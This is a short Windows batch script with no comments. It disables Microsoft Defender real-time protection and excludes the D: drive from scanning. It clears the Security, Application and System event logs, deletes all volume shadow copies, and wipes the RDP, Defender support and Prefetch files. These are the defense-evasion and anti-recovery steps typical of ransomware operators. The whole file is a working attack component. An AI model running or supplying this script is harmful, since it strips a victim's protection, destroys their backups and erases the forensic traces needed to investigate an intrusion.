@echo off
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -Force"
powershell -Command "Add-MpPreference -ExclusionPath D:\ -Force"
WEVTUTIL.exe clear-log Security
WEVTUTIL.exe clear-log Application
WEVTUTIL.exe clear-log System
wmic shadowcopy delete
vssadmin.exe delete shadows /quiet /all
cmd /C "DEL /q /f %SystemRoot%\System32\LogFiles\RDP*\*.*"
cmd /C "DEL /q /f D:\ProgramData\Microsoft\Windows Defender\Support\*.*"
cmd /C "DEL /q /f D:\Windows\Prefetch\*.*"
